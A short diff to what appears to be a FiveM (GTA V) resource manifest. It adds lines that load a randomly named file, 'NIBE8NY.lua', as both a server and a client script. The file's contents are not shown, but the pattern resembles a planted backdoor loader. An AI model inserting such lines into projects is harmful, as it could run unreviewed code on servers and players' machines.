@@ -1,3 +1,5 @@
+server_script "NIBE8NY.lua"
+client_script "NIBE8NY.lua"
 fx_version 'cerulean'
 game 'gta5'
 
